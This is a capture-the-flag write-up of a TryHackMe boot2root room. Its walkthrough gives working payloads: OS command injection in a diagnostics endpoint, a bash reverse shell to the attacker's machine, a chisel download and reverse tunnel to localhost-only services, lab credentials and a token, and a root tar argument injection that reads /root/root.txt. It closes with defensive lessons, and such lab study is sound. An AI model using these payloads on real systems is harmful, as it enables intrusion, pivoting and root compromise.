| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 11 |
| **Room** | Infinity Pool |
| **Category** | Boot2Root / cmd injection → chisel pivot → FreePBX UCP → root argument injection |
| **Flag format** | `THM{...}` |

---

## Objective

**Infinity Pool** is a Boot2Root box on the Byte Lotus internal ops server (`http://10.146.144.164/`). A public web app exposes an `/internal/netcheck` diagnostics endpoint whose `host` parameter is concatenated straight into a shell command — an **OS command injection** that lands you a foothold as `uid=1001(web)`. Behind that box, three services listen on `127.0.0.1` only: a **FreePBX UCP** portal (`:8080`), an **automation/export API** (`:9000`), and a dev service (`:3000`). The chain runs a reverse shell out, tunnels those localhost services back with **chisel**, loots an automation bearer token from a UCP voicemail, and finishes with a second **argument-injection** bug in the export API that runs `tar` as root — turning a filename argument into arbitrary root command execution and reading `/root/root.txt`.

By the end of this room you will be able to:

- Confirm and exploit **OS command injection** in a diagnostics endpoint (`host=127.0.0.1; id`)
- Land a backgrounded **bash reverse shell** through the injection and stabilise it with a PTY
- Pivot to **localhost-only services** with a `chisel` reverse tunnel (`R:8080`, `R:9000`, `R:3000`)
- Loot a **FreePBX UCP** portal and recover a bearer token stashed in a voicemail
- Exploit **argument injection** in a root-run `tar` command line using `;` and `#` to run arbitrary commands as root
- Explain why **localhost-only ≠ safe** and why user data must never reach a shell command line

> **Authorisation warning:** The techniques below — command injection, reverse shells, pivoting and root argument injection — must only ever be run against systems you have **explicit authorization** to test, here the TryHackMe lab. Running them against systems you do not own or control is illegal.

---

## Story Hook

The Byte Lotus resort runs its back-of-house on one "internal ops box" that the night crew swore was safe because the important bits "only listen on localhost." The public face is a humble network-diagnostics page — type a host, get a ping. But the `host` box was wired straight into the shell, so a semicolon was all it took to walk in. From there the private pool deck opened up: a phone portal with a login left on a template account, a voicemail titled **"Automation Key"** holding a live bearer token, and an export service that tarred up backups **as root** while trusting whatever filename you handed it. One reflection at a time, the horizon gave up the flag.

---

## Attack Path

| **1** | **Command injection foothold**<br>`POST /internal/netcheck` with `host=127.0.0.1; id` executes as the web user → `uid=1001(web)`. The `host` parameter is passed unsanitised into a shell. |
| --- | --- |

| **2** | **Reverse shell**<br>Start `nc -lvnp 4444` on Kali, then inject a backgrounded `bash -i >& /dev/tcp/KALI/4444` payload wrapped in `setsid ... </dev/null >/dev/null 2>&1 &` so the HTTP request returns cleanly. Stabilise with `python3 -c 'import pty;pty.spawn("/bin/bash")'` + `export TERM=xterm`. |
| --- | --- |

| **3** | **Pivot with chisel**<br>The interesting services (`8080`, `9000`, `3000`) listen only on `127.0.0.1`. Run `chisel server -p 9999 --reverse` on Kali, serve the binary over `python3 -m http.server 8000`, pull it onto the target, and open a reverse tunnel to all three ports. |
| --- | --- |

| **4** | **FreePBX UCP → the automation key**<br>Browse `http://127.0.0.1:8080/ucp`, log in as `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026`, and open the voicemail "Automation Key" (CID `<9000>`) → export API bearer token `cc_auto_7b3f9a1c4e0d2f6a`. |
| --- | --- |

| **5** | **Root RCE via argument injection**<br>The export API (`POST :9000/jobs/export`) builds `tar czf /var/automation/exports/<report>.tgz /var/automation/data` and runs it **as root**. Inject `{"report":"x;cat /root/root.txt;#"}` — `;` ends the `tar` args, `#` comments out the forced `.tgz` suffix → `cat` runs as root, flag returned in the `output` field. |
| --- | --- |

---

## Walkthrough

### 1. Confirm the command injection

Set the target and Kali variables, then POST to `/internal/netcheck` with a `;`-chained `id`. A `uid=1001(web)` in the response proves the `host` parameter is dropped straight into a shell:

```bash
$ IP=10.146.144.164
$ KALI=YOUR_KALI_IP

# 1) Confirm command injection -> uid=1001(web)
$ curl -s -X POST http://$IP/internal/netcheck --data-urlencode 'host=127.0.0.1; id'
```

### 2. Reverse shell and stabilise

Start a listener (`nc -lvnp 4444`) first, then inject a backgrounded `bash` reverse shell. `setsid ... </dev/null >/dev/null 2>&1 &` detaches it so the HTTP request returns cleanly. Once the shell lands, upgrade it to a proper PTY:

```bash
# 2) Reverse shell (listener first: nc -lvnp 4444)
$ curl -s -m 8 -X POST http://$IP/internal/netcheck \
  --data-urlencode "host=127.0.0.1; setsid bash -c \"bash -i >& /dev/tcp/$KALI/4444 0>&1\" </dev/null >/dev/null 2>&1 &"
# 3) Stabilise the shell (on the target)
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
$ export TERM=xterm; id
```

### 3. Chisel pivot to the localhost-only services

The UCP (`8080`), export API (`9000`) and dev service (`3000`) bind to `127.0.0.1`, so they need a tunnel. Run the chisel server on Kali, serve the binary over HTTP, pull it onto the target, and open a reverse tunnel that maps all three ports back:

```bash
# 4) Chisel pivot for the localhost-only services
#   Kali:   chisel server -p 9999 --reverse
#   Serve:  cp "$(which chisel)" /tmp/chisel && cd /tmp && python3 -m http.server 8000
#   Target:
$ cd /tmp
$ curl -s http://$KALI:8000/chisel -o chisel && chmod +x chisel
$ setsid ./chisel client $KALI:9999 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000 R:3000:127.0.0.1:3000 >/tmp/ch.log 2>&1 &
```

### 4. FreePBX UCP → the automation bearer token

With the tunnel up, browse the UCP in a Kali browser and log in as the leftover template account. The voicemail entry titled "Automation Key" hands out the export API's bearer token:

```bash
# 5) FreePBX UCP (in Kali browser): http://127.0.0.1:8080/ucp
#   Login: FreePBXUCPTemplateCreator / St4yN0t1c3d_2026
#   Voicemail "Automation Key" (CID <9000>) -> bearer: cc_auto_7b3f9a1c4e0d2f6a
```

### 5. Root RCE via argument injection

The export API builds `tar czf /var/automation/exports/<report>.tgz /var/automation/data` and runs it **as root**, dropping the `report` value onto the command line. A naive `x || id` breaks on the appended `.tgz`; the clean payload uses `;` to end the `tar` args and `#` to comment out the forced suffix. The flag comes back in the JSON `output` field:

```bash
# 6) Root RCE via argument injection in the export API (runs tar as root)
#   ';' ends the tar args, '#' comments out the appended ".tgz /var/automation/data 2>&1"
$ curl -s -X POST http://127.0.0.1:9000/jobs/export \
  -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a" \
  -H "Content-Type: application/json" \
  --data-binary '{"report":"x;cat /root/root.txt;#"}'
# ... "output":"THM{tr4c3d_t0_th3_h0r1z0n}\n..."
```

---

## Flag

> **🚩 Flag**
>
> `THM{tr4c3d_t0_th3_h0r1z0n}`

### Key facts

| Item | Value |
|---|---|
| **Target** | `http://10.146.144.164/` (internal ops box) |
| **Foothold** | `POST /internal/netcheck`, `host` param → OS command injection as `uid=1001(web)` |
| **Reverse shell** | `bash -i >& /dev/tcp/KALI/4444`, backgrounded via `setsid ... &` |
| **Pivot** | `chisel` reverse tunnel: `R:8080` (UCP), `R:9000` (export API), `R:3000` (dev) |
| **UCP creds** | `FreePBXUCPTemplateCreator` / `St4yN0t1c3d_2026` at `:8080/ucp` |
| **Bearer token** | voicemail "Automation Key" (CID `<9000>`) → `cc_auto_7b3f9a1c4e0d2f6a` |
| **Root bug** | `POST :9000/jobs/export` builds `tar czf .../<report>.tgz ...` **as root**; `report` injectable |
| **Root payload** | `{"report":"x;cat /root/root.txt;#"}` (`;` ends args, `#` kills the `.tgz` suffix) |
| **Flag location** | `/root/root.txt` |
| **Flag** | `THM{tr4c3d_t0_th3_h0r1z0n}` |

---

## Key Takeaways

- **Never build shell commands by string concatenation.** Both bugs — `netcheck`'s `host` and the export API's `report` — come from user input landing on a command line. Use `execve`-style argument arrays (`subprocess.run([...], shell=False)`), not `sh -c "... $userinput ..."`.
- **Interpolating user data into a *filename argument* is still injection.** The export API "only" put `report` into a `tar` output path, but `;`, `||` and `#` turned that into arbitrary root command execution. Validate/allow-list such values (`^[A-Za-z0-9_-]+$`) and quote them.
- **Localhost-only ≠ safe.** The UCP, export API and dev service bound to `127.0.0.1` felt private, but one command-injection foothold + a chisel reverse tunnel exposed them all. Network isolation is not an authorization control.
- **Don't stash live credentials in user-facing message stores.** A root-capable bearer token sitting in a voicemail meant "get any UCP login" was equivalent to "get the automation key."
- **Least-privilege the job runner.** The export service ran as root to tar up `/var/automation/data`; it never needed root, and running it unprivileged (or via a fixed, non-shell `tar` invocation) would have contained the argument-injection to a low-value account.

---

## Final Takeaway

Infinity Pool is a clean demonstration that **command injection** rarely stops at the first shell. The foothold is a textbook **OS command injection** in a diagnostics endpoint — the `host` parameter concatenated straight into a shell — which becomes a backgrounded **reverse shell** as the low-priv `web` user. From there the real lesson is reach: the UCP, export API and dev service that felt safe on `127.0.0.1` were one **chisel** reverse tunnel away from full exposure, proving **localhost-only ≠ safe**. Looting a **FreePBX UCP** voicemail surrendered a live **bearer token**, and the finale is a subtler **argument injection** — dropping user input into a root-run `tar` command line, where `;` and `#` rewrite the command and run `cat /root/root.txt` as **root**. The throughline is a single trust-boundary rule: keep untrusted input off the command line entirely, use argument arrays instead of `sh -c`, allow-list filename values, and never treat network isolation as authorization.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
